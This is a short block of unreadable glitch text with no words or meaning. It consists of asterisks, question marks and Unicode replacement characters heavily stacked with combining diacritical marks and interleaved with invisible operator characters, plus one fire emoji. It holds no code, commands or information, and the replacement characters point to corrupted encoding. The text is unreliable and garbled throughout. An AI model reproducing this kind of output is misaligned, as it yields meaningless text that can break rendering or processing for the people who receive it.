̡̬̺̳̣̗̪̤̳̙͓̣͓͟*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖̈͆